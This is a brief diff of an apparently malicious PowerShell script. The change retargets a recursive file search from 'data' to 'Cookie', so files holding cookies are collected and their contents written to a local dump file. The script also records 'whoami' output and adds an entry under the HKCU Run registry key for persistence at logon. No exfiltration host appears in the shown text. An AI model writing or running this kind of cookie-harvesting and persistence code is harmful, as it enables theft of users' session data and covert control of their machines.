@@ -1,4 +1,4 @@
-Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'data' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_} | Out-File -FilePath ./Process5.txt 
+Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'Cookie' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_} | Out-File -FilePath ./Process5.txt 
 
 whoami | Out-File -FilePath ./Process5.txt -Append
 
@@ -30,5 +30,4 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 
 Start-Sleep -Seconds 1.5
 exit
-
 
